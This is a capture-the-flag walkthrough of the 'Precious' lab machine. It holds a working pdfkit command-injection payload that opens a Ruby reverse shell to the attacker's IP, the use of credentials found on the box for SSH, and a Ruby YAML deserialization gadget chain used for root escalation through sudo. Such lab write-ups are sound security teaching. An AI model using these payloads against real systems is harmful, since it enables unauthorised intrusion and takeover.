
![[precious logo.png]]


![Pasted image 20251016000404](Image/Pasted%20image%2020251016000404.png)

We see on port 80 that url mention `precious.htb`, so let's add it to our file /etc/hosts

```
echo '10.129.185.101 precious.htb' >> /etc/hosts
```
Then we refresh the website

![Pasted image 20251016000550](Image/Pasted%20image%2020251016000550.png)
After trying several payload, we notice with the HTPP Header on BurpSuite the language used in the application

![Pasted image 20251016002350](Image/Pasted%20image%2020251016002350.png)

It is `ruby`

Let's try to analyse the pdf the application generate us

We start running our python web server

```
python3 -m http.server
```
and then enter our IP to convert it to pdf

![Pasted image 20251016003119](Image/Pasted%20image%2020251016003119.png)

Now we use the tool `exiftool` to analyse the metadata of the pdf file

![Pasted image 20251016003227](Image/Pasted%20image%2020251016003227.png)

Interesting, we find the library that ruby use to generate the pdf and it's version, which is `pdfkit v0.8.6` , 

I found the CVE-2022-25765 and a poc here https://www.ctfiot.com/84447.html

Let's start our listener and our python web server 

```
nc -lvnp 9001
```
```
python3 -m http.server
```

And we run this in the web application

```
http://10.10.14.82:80/?name=%20` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.82",9001))'`
```

And we get our reverse shell !

![Pasted image 20251016005645](Image/Pasted%20image%2020251016005645.png)

Let's stabilize it with the following command

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
CRTL+Z

```
stty raw -echo && fg
```
```
reset
```
```
export TERM=xterm
```

Now that we have a fully interactive shell, let's look for info

We navigate to the ruby /home directory and we find an interesting hidden folder

![Pasted image 20251016010036](Image/Pasted%20image%2020251016010036.png)

After enumerating it, we found out it's a config directory and we find the credentials for user **henry**

![Pasted image 20251016010200](Image/Pasted%20image%2020251016010200.png)

We use ssh to connect to Henry

![Pasted image 20251016010345](Image/Pasted%20image%2020251016010345.png)

And we get the user.txt flag

![Pasted image 20251016010512](Image/Pasted%20image%2020251016010512.png)

We run the command `sudo -l` to see our privilege

![Pasted image 20251016011651](Image/Pasted%20image%2020251016011651.png)

Ok we can run something, let's run it to see where it leads us

![Pasted image 20251016011742](Image/Pasted%20image%2020251016011742.png)

Ok, so the script tries to find the file **dependencies.yml** which doesn't exist.
Maybe we can create this file with our payload inside to get our privesc ?

After a bit of research, i found this article explaining how to get an RCE with a yml file

https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

Let's copy the script into the file **dependencies.yml** that we will create

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
```

We run our sudo command and we should be root

![Pasted image 20251016012411](Image/Pasted%20image%2020251016012411.png)

Indeed we are root !

We grab the flag under `/root/root.txt` and that conclude this box